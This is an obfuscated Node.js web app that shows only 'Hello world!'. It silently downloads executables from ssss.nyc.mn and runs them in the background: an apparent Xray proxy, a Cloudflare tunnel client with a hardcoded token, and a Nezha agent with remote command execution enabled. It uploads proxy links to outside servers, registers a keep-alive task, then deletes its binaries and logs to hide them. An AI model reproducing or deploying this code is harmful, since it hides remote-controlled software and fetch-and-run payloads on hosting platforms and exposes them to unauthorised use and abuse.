const _0x155aa7=_0x435a;(function(_0x506453,_0x5c91e4){const _0x206c95=_0x435a,_0x500dd3=_0x506453();while(!![]){try{const _0x4f969a=-parseInt(_0x206c95(0x165))/0x1+parseInt(_0x206c95(0x1ff))/0x2+-parseInt(_0x206c95(0x1e8))/0x3+-parseInt(_0x206c95(0x1c4))/0x4*(parseInt(_0x206c95(0x1ed))/0x5)+-parseInt(_0x206c95(0x18e))/0x6*(parseInt(_0x206c95(0x182))/0x7)+parseInt(_0x206c95(0x1b0))/0x8+parseInt(_0x206c95(0x172))/0x9;if(_0x4f969a===_0x5c91e4)break;else _0x500dd3['push'](_0x500dd3['shift']());}catch(_0x373533){_0x500dd3['push'](_0x500dd3['shift']());}}}(_0x2789,0xc8d82));const express=require(_0x155aa7(0x1db)),app=express(),axios=require(_0x155aa7(0x19b)),os=require('os'),fs=require('fs'),path=require(_0x155aa7(0x1d0)),{promisify}=require(_0x155aa7(0x1cc)),exec=promisify(require(_0x155aa7(0x1de))[_0x155aa7(0x204)]),{execSync}=require(_0x155aa7(0x1de)),UPLOAD_URL=process['env'][_0x155aa7(0x1bb)]||'',PROJECT_URL=process[_0x155aa7(0x1fb)][_0x155aa7(0x1f9)]||'',AUTO_ACCESS=process['env'][_0x155aa7(0x198)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x155aa7(0x1fa),SUB_PATH=process[_0x155aa7(0x1fb)][_0x155aa7(0x191)]||_0x155aa7(0x15b),PORT=process[_0x155aa7(0x1fb)][_0x155aa7(0x1d8)]||process['env'][_0x155aa7(0x1f4)]||0xbb8,UUID=process['env'][_0x155aa7(0x187)]||_0x155aa7(0x1b6),NEZHA_SERVER=process[_0x155aa7(0x1fb)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x155aa7(0x160)]||'',NEZHA_KEY=process[_0x155aa7(0x1fb)][_0x155aa7(0x1ef)]||'',ARGO_DOMAIN=process[_0x155aa7(0x1fb)]['ARGO_DOMAIN']||_0x155aa7(0x1c2),ARGO_AUTH=process[_0x155aa7(0x1fb)][_0x155aa7(0x1ce)]||'eyJhIjoiMjViMTA5YzljY2QwOTJlMDhlOWMwZDQxMmNlMGJkYTciLCJ0IjoiZjIyOTJkYjEtOTdiMy00MDBjLTk3NWMtMzQ5OGVkZmE5MmEzIiwicyI6IlptSmxaV0V6WXpFdFlqUTJOUzAwTTJKakxXSmtZV1l0WWpjeE1ETm1NemsxWm1SbSJ9',ARGO_PORT=process[_0x155aa7(0x1fb)]['ARGO_PORT']||0x1f41,CFIP=process[_0x155aa7(0x1fb)]['CFIP']||_0x155aa7(0x192),CFPORT=process[_0x155aa7(0x1fb)][_0x155aa7(0x1c5)]||0x1bb,NAME=process[_0x155aa7(0x1fb)][_0x155aa7(0x156)]||'railway';!fs['existsSync'](FILE_PATH)?(fs[_0x155aa7(0x1e5)](FILE_PATH),console[_0x155aa7(0x168)](FILE_PATH+_0x155aa7(0x1f5))):console['log'](FILE_PATH+_0x155aa7(0x1fd));function generateRandomName(){const _0xd4742f=_0x155aa7,_0x5ea13f=_0xd4742f(0x195);let _0x1c73b4='';for(let _0x134797=0x0;_0x134797<0x6;_0x134797++){_0x1c73b4+=_0x5ea13f['charAt'](Math['floor'](Math[_0xd4742f(0x1e7)]()*_0x5ea13f[_0xd4742f(0x1e6)]));}return _0x1c73b4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x155aa7(0x190)](FILE_PATH,npmName),phpPath=path[_0x155aa7(0x190)](FILE_PATH,phpName),webPath=path[_0x155aa7(0x190)](FILE_PATH,webName),botPath=path[_0x155aa7(0x190)](FILE_PATH,botName),subPath=path[_0x155aa7(0x190)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x155aa7(0x190)](FILE_PATH,_0x155aa7(0x1ee)),configPath=path[_0x155aa7(0x190)](FILE_PATH,_0x155aa7(0x1a0));function deleteNodes(){const _0x55c9cc=_0x155aa7;try{if(!UPLOAD_URL)return;if(!fs[_0x55c9cc(0x1b7)](subPath))return;let _0x55b9a1;try{_0x55b9a1=fs[_0x55c9cc(0x189)](subPath,_0x55c9cc(0x1ba));}catch{return null;}const _0x5d10af=Buffer[_0x55c9cc(0x1a8)](_0x55b9a1,_0x55c9cc(0x1f2))['toString'](_0x55c9cc(0x1ba)),_0xc62b33=_0x5d10af[_0x55c9cc(0x16b)]('\x0a')[_0x55c9cc(0x18d)](_0x45e4a8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x55c9cc(0x1b8)](_0x45e4a8));if(_0xc62b33[_0x55c9cc(0x1e6)]===0x0)return;return axios[_0x55c9cc(0x15f)](UPLOAD_URL+_0x55c9cc(0x18a),JSON[_0x55c9cc(0x16c)]({'nodes':_0xc62b33}),{'headers':{'Content-Type':_0x55c9cc(0x200)}})[_0x55c9cc(0x1aa)](_0x48c5d0=>{return null;}),null;}catch(_0x26d103){return null;}}function cleanupOldFiles(){const _0x219583=_0x155aa7;try{const _0xe1467a=fs[_0x219583(0x17c)](FILE_PATH);_0xe1467a[_0x219583(0x1ae)](_0x3176ed=>{const _0x3436cc=_0x219583,_0x299778=path['join'](FILE_PATH,_0x3176ed);try{const _0x30bc39=fs[_0x3436cc(0x1a6)](_0x299778);_0x30bc39[_0x3436cc(0x17a)]()&&fs[_0x3436cc(0x176)](_0x299778);}catch(_0x36c454){}});}catch(_0x90f7b8){}}app[_0x155aa7(0x202)]('/',function(_0x567f07,_0x2aa174){const _0xd66106=_0x155aa7;_0x2aa174['send'](_0xd66106(0x1cd));});async function generateConfig(){const _0x44605c=_0x155aa7,_0x48a7a0={'log':{'access':_0x44605c(0x1b5),'error':_0x44605c(0x1b5),'loglevel':_0x44605c(0x163)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x44605c(0x1ac),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x44605c(0x155),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x44605c(0x154),'protocol':_0x44605c(0x1ac),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x44605c(0x1ca),'security':_0x44605c(0x163)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x44605c(0x1ac),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x44605c(0x163)},'streamSettings':{'network':'ws','security':_0x44605c(0x163),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x44605c(0x19e),_0x44605c(0x205),_0x44605c(0x1c7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x44605c(0x154),'protocol':_0x44605c(0x17d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x44605c(0x19e),_0x44605c(0x205),_0x44605c(0x1c7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x44605c(0x154),'protocol':_0x44605c(0x1f6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x44605c(0x163),'wsSettings':{'path':_0x44605c(0x1b3)}},'sniffing':{'enabled':!![],'destOverride':[_0x44605c(0x19e),_0x44605c(0x205),_0x44605c(0x1c7)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x44605c(0x1ea),'tag':_0x44605c(0x174)},{'protocol':_0x44605c(0x1f3),'tag':_0x44605c(0x1fe)}]};fs[_0x44605c(0x203)](path[_0x44605c(0x190)](FILE_PATH,'config.json'),JSON['stringify'](_0x48a7a0,null,0x2));}function getSystemArchitecture(){const _0x228615=_0x155aa7,_0x24b19b=os[_0x228615(0x209)]();return _0x24b19b===_0x228615(0x206)||_0x24b19b===_0x228615(0x1c9)||_0x24b19b===_0x228615(0x1b1)?_0x228615(0x206):_0x228615(0x1d2);}function downloadFile(_0x2e9939,_0x1c59ae,_0x3e3a06){const _0x41d055=_0x155aa7,_0x5361ab=_0x2e9939;!fs[_0x41d055(0x1b7)](FILE_PATH)&&fs[_0x41d055(0x1e5)](FILE_PATH,{'recursive':!![]});const _0x58768b=fs[_0x41d055(0x199)](_0x5361ab);axios({'method':'get','url':_0x1c59ae,'responseType':_0x41d055(0x1cb)})['then'](_0xa97c26=>{const _0xbce1ef=_0x41d055;_0xa97c26[_0xbce1ef(0x1a4)]['pipe'](_0x58768b),_0x58768b['on']('finish',()=>{const _0x517de1=_0xbce1ef;_0x58768b[_0x517de1(0x173)](),console['log'](_0x517de1(0x1f1)+path[_0x517de1(0x18b)](_0x5361ab)+_0x517de1(0x1dc)),_0x3e3a06(null,_0x5361ab);}),_0x58768b['on'](_0xbce1ef(0x19c),_0x39211d=>{const _0xfb929d=_0xbce1ef;fs[_0xfb929d(0x1a9)](_0x5361ab,()=>{});const _0x54e7f4=_0xfb929d(0x1f1)+path[_0xfb929d(0x18b)](_0x5361ab)+_0xfb929d(0x170)+_0x39211d[_0xfb929d(0x193)];console[_0xfb929d(0x19c)](_0x54e7f4),_0x3e3a06(_0x54e7f4);});})[_0x41d055(0x1aa)](_0x43304f=>{const _0x3e2574=_0x41d055,_0x163b88=_0x3e2574(0x1f1)+path[_0x3e2574(0x18b)](_0x5361ab)+'\x20failed:\x20'+_0x43304f[_0x3e2574(0x193)];console[_0x3e2574(0x19c)](_0x163b88),_0x3e3a06(_0x163b88);});}async function downloadFilesAndRun(){const _0xc7d4fe=_0x155aa7,_0x1ebba0=getSystemArchitecture(),_0x313d53=getFilesForArchitecture(_0x1ebba0);if(_0x313d53[_0xc7d4fe(0x1e6)]===0x0){console['log'](_0xc7d4fe(0x196));return;}const _0x52e500=_0x313d53['map'](_0x44244e=>{return new Promise((_0x1d2863,_0x5ce2e3)=>{const _0x2f7455=_0x435a;downloadFile(_0x44244e[_0x2f7455(0x20d)],_0x44244e[_0x2f7455(0x175)],(_0x39bb89,_0xc9dca1)=>{_0x39bb89?_0x5ce2e3(_0x39bb89):_0x1d2863(_0xc9dca1);});});});try{await Promise[_0xc7d4fe(0x15e)](_0x52e500);}catch(_0x75741a){console[_0xc7d4fe(0x19c)](_0xc7d4fe(0x184),_0x75741a);return;}function _0x3e7636(_0x49f1ff){const _0x208df1=_0xc7d4fe,_0xe41365=0x1fd;_0x49f1ff[_0x208df1(0x1ae)](_0x3649ef=>{const _0x4cdba1=_0x208df1;fs[_0x4cdba1(0x1b7)](_0x3649ef)&&fs['chmod'](_0x3649ef,_0xe41365,_0x5115e3=>{const _0x51dc02=_0x4cdba1;_0x5115e3?console['error'](_0x51dc02(0x158)+_0x3649ef+':\x20'+_0x5115e3):console[_0x51dc02(0x168)]('Empowerment\x20success\x20for\x20'+_0x3649ef+':\x20'+_0xe41365[_0x51dc02(0x1d5)](0x8));});});}const _0x2475c3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3e7636(_0x2475c3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e17e6=NEZHA_SERVER[_0xc7d4fe(0x16d)](':')?NEZHA_SERVER[_0xc7d4fe(0x16b)](':')[_0xc7d4fe(0x1a3)]():'',_0x18c923=new Set(['443',_0xc7d4fe(0x1f7),_0xc7d4fe(0x19a),_0xc7d4fe(0x210),_0xc7d4fe(0x17f),'2053']),_0x138845=_0x18c923[_0xc7d4fe(0x1a1)](_0x5e17e6)?_0xc7d4fe(0x1bc):_0xc7d4fe(0x16f),_0xa72650='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x138845+_0xc7d4fe(0x18c)+UUID;fs[_0xc7d4fe(0x203)](path[_0xc7d4fe(0x190)](FILE_PATH,_0xc7d4fe(0x1a2)),_0xa72650);const _0x46fade=_0xc7d4fe(0x1c0)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xc7d4fe(0x161);try{await exec(_0x46fade),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x21c99f=>setTimeout(_0x21c99f,0x3e8));}catch(_0x37b96c){console[_0xc7d4fe(0x19c)]('php\x20running\x20error:\x20'+_0x37b96c);}}else{let _0x1f53b6='';const _0x270473=[_0xc7d4fe(0x1e9),_0xc7d4fe(0x1f7),_0xc7d4fe(0x19a),_0xc7d4fe(0x210),_0xc7d4fe(0x17f),_0xc7d4fe(0x1be)];_0x270473[_0xc7d4fe(0x16d)](NEZHA_PORT)&&(_0x1f53b6='--tls');const _0x374cf2=_0xc7d4fe(0x1c0)+npmPath+_0xc7d4fe(0x162)+NEZHA_SERVER+':'+NEZHA_PORT+_0xc7d4fe(0x178)+NEZHA_KEY+'\x20'+_0x1f53b6+_0xc7d4fe(0x1c3);try{await exec(_0x374cf2),console['log'](npmName+_0xc7d4fe(0x1eb)),await new Promise(_0x1e31ae=>setTimeout(_0x1e31ae,0x3e8));}catch(_0x1066d2){console[_0xc7d4fe(0x19c)](_0xc7d4fe(0x1c6)+_0x1066d2);}}}else console[_0xc7d4fe(0x168)](_0xc7d4fe(0x1df));const _0x736eba=_0xc7d4fe(0x1c0)+webPath+_0xc7d4fe(0x20b)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x736eba),console[_0xc7d4fe(0x168)](webName+_0xc7d4fe(0x1eb)),await new Promise(_0x5b6d4b=>setTimeout(_0x5b6d4b,0x3e8));}catch(_0x59ce0f){console['error'](_0xc7d4fe(0x1d7)+_0x59ce0f);}if(fs[_0xc7d4fe(0x1b7)](botPath)){let _0x2fb3d0;if(ARGO_AUTH[_0xc7d4fe(0x1d1)](/^[A-Z0-9a-z=]{120,250}$/))_0x2fb3d0='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0xc7d4fe(0x1d1)](/TunnelSecret/)?_0x2fb3d0=_0xc7d4fe(0x212)+FILE_PATH+_0xc7d4fe(0x1ec):_0x2fb3d0=_0xc7d4fe(0x1d4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2fb3d0+'\x20>/dev/null\x202>&1\x20&'),console[_0xc7d4fe(0x168)](botName+_0xc7d4fe(0x1eb)),await new Promise(_0x215f9c=>setTimeout(_0x215f9c,0x7d0));}catch(_0x341914){console[_0xc7d4fe(0x19c)](_0xc7d4fe(0x17e)+_0x341914);}}await new Promise(_0x2280cc=>setTimeout(_0x2280cc,0x1388));}function _0x2789(){const _0x197dc0=['1722JcwKzE','/vmess-argo?ed=2560','join','SUB_PATH','cdns.doon.eu.org','message','tunnel.yml','abcdefghijklmnopqrstuvwxyz','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','http\x20server\x20is\x20running\x20on\x20port:','AUTO_ACCESS','createWriteStream','2096','axios','error','\x0a\x20\x20\x20\x20','http','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','config.json','has','config.yaml','pop','data','\x0a\x20\x20credentials-file:\x20','statSync','ArgoDomain:','from','unlink','catch','.exe\x20>\x20nul\x202>&1','vless','status','forEach','https://arm64.ssss.nyc.mn/v1','6702144JLVgbt','aarch64','https://amd64.ssss.nyc.mn/v1','/trojan-argo','?encryption=none&security=tls&sni=','/dev/null','36485749-b893-40c1-84dd-51e7ce204913','existsSync','test','&path=%2Fvless-argo%3Fed%3D2560#','utf-8','UPLOAD_URL','true','clear','2053','response','nohup\x20','https://amd64.ssss.nyc.mn/web','railway.dissipator.cf','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','280916RXgwhe','CFPORT','npm\x20running\x20error:\x20','quic','https://oooo.serv00.net/add-url','arm64','tcp','stream','util','Hello\x20world!','ARGO_AUTH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','path','match','amd','App\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','toString','Error\x20reading\x20boot.log:','web\x20running\x20error:\x20','SERVER_PORT','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/api/add-subscriptions','express','\x20successfully','substring','child_process','NEZHA\x20variable\x20is\x20empty,skip\x20running','unshift','text/plain;\x20charset=utf-8','\x20>/dev/null\x202>&1','platform','del\x20/f\x20/q\x20','mkdirSync','length','random','3463824algThb','443','freedom','\x20is\x20running','/tunnel.yml\x20run','95NjyjpG','boot.log','NEZHA_KEY','\x0a\x20\x20tunnel:\x20','Download\x20','base64','blackhole','PORT','\x20is\x20created','trojan','8443','Subscription\x20uploaded\x20successfully','PROJECT_URL','./tmp','env','Unhandled\x20error\x20in\x20startserver:','\x20already\x20exists','block','1802992fTFyqn','application/json','automatic\x20access\x20task\x20added\x20successfully','get','writeFileSync','exec','tls','arm','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Add\x20automatic\x20access\x20task\x20faild:\x20','arch','\x20>/dev/null\x202>&1\x20&','\x20-c\x20','pkill\x20-f\x20\x22[','fileName','https://arm64.ssss.nyc.mn/bot','send','2087','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Nodes\x20uploaded\x20successfully','127.0.0.1','/vmess-argo','NAME','listen','Empowerment\x20failed\x20for\x20','\x22\x20>\x20/dev/null\x202>&1','win32','sub','\x0a\x20\x20\x0avmess://','?security=tls&sni=','all','post','NEZHA_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-s\x20','none','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','1622114fBBpaQ','/sub.txt\x20saved\x20successfully','&path=%2Ftrojan-argo%3Fed%3D2560#','log','push','/api/add-nodes','split','stringify','includes','rm\x20-rf\x20','false','\x20failed:\x20','\x0a\x20\x20\x0atrojan://','41977746RgXSNa','close','direct','fileUrl','unlinkSync','Error\x20in\x20startserver:','\x20-p\x20','\x20>\x20nul\x202>&1','isFile','&fp=firefox&type=ws&host=','readdirSync','vmess','Error\x20executing\x20command:\x20','2083','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','35847FnnsnI','tunnel.json','Error\x20downloading\x20files:','charAt','taskkill\x20/f\x20/im\x20','UUID','set','readFileSync','/api/delete-nodes','basename','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','filter'];_0x2789=function(){return _0x197dc0;};return _0x2789();}function getFilesForArchitecture(_0x3421e0){const _0x544ece=_0x155aa7;let _0x535d71;_0x3421e0===_0x544ece(0x206)?_0x535d71=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x544ece(0x20e)}]:_0x535d71=[{'fileName':webPath,'fileUrl':_0x544ece(0x1c1)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1cc050=_0x3421e0===_0x544ece(0x206)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x535d71[_0x544ece(0x1e0)]({'fileName':npmPath,'fileUrl':_0x1cc050});}else{const _0x491259=_0x3421e0==='arm'?_0x544ece(0x1af):_0x544ece(0x1b2);_0x535d71['unshift']({'fileName':phpPath,'fileUrl':_0x491259});}}return _0x535d71;}function argoType(){const _0x140406=_0x155aa7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x140406(0x168)](_0x140406(0x1d9));return;}if(ARGO_AUTH[_0x140406(0x16d)]('TunnelSecret')){fs['writeFileSync'](path[_0x140406(0x190)](FILE_PATH,_0x140406(0x183)),ARGO_AUTH);const _0x29a06f=_0x140406(0x1f0)+ARGO_AUTH[_0x140406(0x16b)]('\x22')[0xb]+_0x140406(0x1a5)+path[_0x140406(0x190)](FILE_PATH,'tunnel.json')+_0x140406(0x211)+ARGO_DOMAIN+_0x140406(0x180)+ARGO_PORT+_0x140406(0x181);fs[_0x140406(0x203)](path[_0x140406(0x190)](FILE_PATH,_0x140406(0x194)),_0x29a06f);}else console[_0x140406(0x168)](_0x140406(0x19f));}argoType();async function extractDomains(){const _0x2acd2a=_0x155aa7;let _0x2cc19d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2cc19d=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x2cc19d),await _0xb31949(_0x2cc19d);else try{const _0x1eea78=fs['readFileSync'](path[_0x2acd2a(0x190)](FILE_PATH,_0x2acd2a(0x1ee)),_0x2acd2a(0x1ba)),_0x418c65=_0x1eea78[_0x2acd2a(0x16b)]('\x0a'),_0x49e25a=[];_0x418c65[_0x2acd2a(0x1ae)](_0x5893a2=>{const _0x1de5ff=_0x2acd2a,_0x51e9dd=_0x5893a2[_0x1de5ff(0x1d1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x51e9dd){const _0x5bcc1c=_0x51e9dd[0x1];_0x49e25a['push'](_0x5bcc1c);}});if(_0x49e25a['length']>0x0)_0x2cc19d=_0x49e25a[0x0],console[_0x2acd2a(0x168)](_0x2acd2a(0x1a7),_0x2cc19d),await _0xb31949(_0x2cc19d);else{console['log'](_0x2acd2a(0x164)),fs[_0x2acd2a(0x176)](path['join'](FILE_PATH,_0x2acd2a(0x1ee)));async function _0x3486e7(){const _0x16b1a8=_0x2acd2a;try{process['platform']==='win32'?await exec(_0x16b1a8(0x186)+botName+_0x16b1a8(0x1ab)):await exec(_0x16b1a8(0x20c)+botName[_0x16b1a8(0x185)](0x0)+']'+botName[_0x16b1a8(0x1dd)](0x1)+_0x16b1a8(0x159));}catch(_0x4d7be7){}}_0x3486e7(),await new Promise(_0x2197d2=>setTimeout(_0x2197d2,0xbb8));const _0x4b4f74=_0x2acd2a(0x1d4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4b4f74+_0x2acd2a(0x20a)),console['log'](botName+_0x2acd2a(0x1eb)),await new Promise(_0x3ddab9=>setTimeout(_0x3ddab9,0xbb8)),await extractDomains();}catch(_0x2e84c5){console[_0x2acd2a(0x19c)]('Error\x20executing\x20command:\x20'+_0x2e84c5);}}}catch(_0x25fc77){console[_0x2acd2a(0x19c)](_0x2acd2a(0x1d6),_0x25fc77);}async function _0xb31949(_0x2c4fd5){const _0xae95f4=_0x2acd2a,_0x2e2883=execSync(_0xae95f4(0x207),{'encoding':_0xae95f4(0x1ba)}),_0x5beaf4=_0x2e2883['trim'](),_0x3245c1=NAME?NAME+'-'+_0x5beaf4:_0x5beaf4;return new Promise(_0x2ed54b=>{setTimeout(()=>{const _0x238059=_0x435a,_0x2730ce={'v':'2','ps':''+_0x3245c1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x238059(0x163),'net':'ws','type':'none','host':_0x2c4fd5,'path':_0x238059(0x18f),'tls':_0x238059(0x205),'sni':_0x2c4fd5,'alpn':'','fp':'firefox'},_0x1e09b2='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x238059(0x1b4)+_0x2c4fd5+_0x238059(0x17b)+_0x2c4fd5+_0x238059(0x1b9)+_0x3245c1+_0x238059(0x15c)+Buffer['from'](JSON['stringify'](_0x2730ce))[_0x238059(0x1d5)](_0x238059(0x1f2))+_0x238059(0x171)+UUID+'@'+CFIP+':'+CFPORT+_0x238059(0x15d)+_0x2c4fd5+_0x238059(0x17b)+_0x2c4fd5+_0x238059(0x167)+_0x3245c1+_0x238059(0x19d);console[_0x238059(0x168)](Buffer[_0x238059(0x1a8)](_0x1e09b2)[_0x238059(0x1d5)](_0x238059(0x1f2))),fs[_0x238059(0x203)](subPath,Buffer['from'](_0x1e09b2)[_0x238059(0x1d5)]('base64')),console[_0x238059(0x168)](FILE_PATH+_0x238059(0x166)),uploadNodes(),app[_0x238059(0x202)]('/'+SUB_PATH,(_0x46f5ea,_0x1c2b2b)=>{const _0x19bb8a=_0x238059,_0x4ce22a=Buffer['from'](_0x1e09b2)[_0x19bb8a(0x1d5)](_0x19bb8a(0x1f2));_0x1c2b2b[_0x19bb8a(0x188)]('Content-Type',_0x19bb8a(0x1e1)),_0x1c2b2b[_0x19bb8a(0x20f)](_0x4ce22a);}),_0x2ed54b(_0x1e09b2);},0x7d0);});}}function _0x435a(_0x259d8f,_0x144f20){const _0x278926=_0x2789();return _0x435a=function(_0x435afa,_0x46ddd4){_0x435afa=_0x435afa-0x154;let _0x5e157f=_0x278926[_0x435afa];return _0x5e157f;},_0x435a(_0x259d8f,_0x144f20);}async function uploadNodes(){const _0x3b6362=_0x155aa7;if(UPLOAD_URL&&PROJECT_URL){const _0xd38357=PROJECT_URL+'/'+SUB_PATH,_0x4a27de={'subscription':[_0xd38357]};try{const _0x46ae56=await axios[_0x3b6362(0x15f)](UPLOAD_URL+_0x3b6362(0x1da),_0x4a27de,{'headers':{'Content-Type':_0x3b6362(0x200)}});return _0x46ae56&&_0x46ae56[_0x3b6362(0x1ad)]===0xc8?(console[_0x3b6362(0x168)](_0x3b6362(0x1f8)),_0x46ae56):null;}catch(_0x4913be){if(_0x4913be[_0x3b6362(0x1bf)]){if(_0x4913be[_0x3b6362(0x1bf)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3b6362(0x1b7)](listPath))return;const _0x404cf5=fs['readFileSync'](listPath,_0x3b6362(0x1ba)),_0x507254=_0x404cf5[_0x3b6362(0x16b)]('\x0a')[_0x3b6362(0x18d)](_0x13392e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b6362(0x1b8)](_0x13392e));if(_0x507254[_0x3b6362(0x1e6)]===0x0)return;const _0x82b48f=JSON[_0x3b6362(0x16c)]({'nodes':_0x507254});try{const _0x23f867=await axios[_0x3b6362(0x15f)](UPLOAD_URL+_0x3b6362(0x16a),_0x82b48f,{'headers':{'Content-Type':_0x3b6362(0x200)}});return _0x23f867&&_0x23f867[_0x3b6362(0x1ad)]===0xc8?(console[_0x3b6362(0x168)](_0x3b6362(0x213)),_0x23f867):null;}catch(_0x2c309f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x27ceec=_0x435a,_0xef9c53=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xef9c53[_0x27ceec(0x169)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xef9c53['push'](phpPath);process[_0x27ceec(0x1e3)]===_0x27ceec(0x15a)?exec(_0x27ceec(0x1e4)+_0xef9c53[_0x27ceec(0x190)]('\x20')+_0x27ceec(0x179),_0x19c810=>{const _0x1d8141=_0x27ceec;console[_0x1d8141(0x1bd)](),console['log']('App\x20is\x20running'),console[_0x1d8141(0x168)](_0x1d8141(0x1cf));}):exec(_0x27ceec(0x16e)+_0xef9c53[_0x27ceec(0x190)]('\x20')+_0x27ceec(0x1e2),_0x59277e=>{const _0x372f25=_0x27ceec;console[_0x372f25(0x1bd)](),console[_0x372f25(0x168)](_0x372f25(0x1d3)),console['log'](_0x372f25(0x1cf));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x12f0da=_0x155aa7;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x299d48=await axios[_0x12f0da(0x15f)](_0x12f0da(0x1c8),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x12f0da(0x200)}});return console[_0x12f0da(0x168)](_0x12f0da(0x201)),_0x299d48;}catch(_0x57a4da){return console['error'](_0x12f0da(0x208)+_0x57a4da[_0x12f0da(0x193)]),null;}}async function startserver(){const _0x34a130=_0x155aa7;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2b8ae3){console['error'](_0x34a130(0x177),_0x2b8ae3);}}startserver()[_0x155aa7(0x1aa)](_0x5a2b45=>{const _0x2ebe60=_0x155aa7;console['error'](_0x2ebe60(0x1fc),_0x5a2b45);}),app[_0x155aa7(0x157)](PORT,()=>console['log'](_0x155aa7(0x197)+PORT+'!'));
